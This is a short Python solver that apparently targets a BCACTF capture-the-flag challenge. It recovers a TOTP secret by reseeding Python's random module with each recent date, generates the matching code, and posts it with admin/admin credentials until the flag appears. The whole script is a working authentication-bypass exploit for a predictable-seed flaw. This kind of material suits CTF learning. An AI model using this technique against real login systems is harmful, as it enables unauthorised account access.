import datetime
import random
import requests
import pyotp

URL = "http://challs.bcactf.com:31772/"
SECRET_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'

start_date = datetime.datetime.today() - datetime.timedelta(days=30)

for day_offset in range(31):
    current_date = start_date + datetime.timedelta(days=day_offset)
    current_date_str = current_date.strftime('%Y-%m-%d')

    random.seed(current_date_str)
    totp_secret = ''.join([random.choice(SECRET_ALPHABET) for _ in range(20)])

    totp = pyotp.TOTP(totp_secret)

    totp_code = totp.now()

    print(f"Date: {current_date_str}, TOTP Secret: {totp_secret}, Code: {totp_code}")

    # Send the POST request with the TOTP code
    payload = {
        'username': 'admin',
        'password': 'admin',
        'totp': totp_code
    }

    response = requests.post(URL, data=payload)
    if "ctf" in response.text:
        print(response.text)
        break
